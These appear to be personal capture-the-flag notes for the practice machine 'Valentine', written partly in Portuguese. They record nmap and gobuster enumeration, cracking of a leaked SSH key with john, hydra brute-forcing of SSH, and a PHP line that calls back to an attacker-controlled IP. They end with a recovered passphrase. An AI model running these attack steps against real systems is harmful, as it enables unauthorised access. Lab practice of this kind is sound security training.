Valentine
========================

# Enumeration

    sudo nmap_enum 10.10.10.79 | tee nmap_output.txt
    
![qownnotes-media-KzvBTm](../../../media/qownnotes-media-KzvBTm.png)

    sudo nmap -sU -p 53,161,111,137,139,500,2049 -Pn 10.10.10.79 | tee nmap_udp_output.txt

Nada



    gobuster dir -u http://10.10.10.79 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -k -t 16 -o "tcp_port_protocol_gobuster.txt"
    
![qownnotes-media-xkTuDC](../../../media/qownnotes-media-xkTuDC.png)


    firefox https://10.10.10.79/dev

![qownnotes-media-LIAvih](../../../media/qownnotes-media-LIAvih.png)

![qownnotes-media-ykCdrw](../../../media/qownnotes-media-ykCdrw.png)

![qownnotes-media-dwiCUg](../../../media/qownnotes-media-dwiCUg.png)


    cat ssh_key

![qownnotes-media-xqapyf](../../../media/qownnotes-media-xqapyf.png)

    ssh2john ssh_key > ssh.hash
    john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash

![qownnotes-media-xjgxIe](../../../media/qownnotes-media-xjgxIe.png)

Sem sucesso

    <?php $ch = curl_init() ; curl_exec('http://10.10.14.5:8080');curl_close($ch) ;?>

    gobuster dir -u https://10.10.10.79 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -k -t 16 -o "tcp_port_protocol_https_gobuster.txt"


    hydra -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt 10.10.10.79 ssh

![qownnotes-media-ocCnbd](../../../media/qownnotes-media-ocCnbd.png)

heartbleedbelievethehype
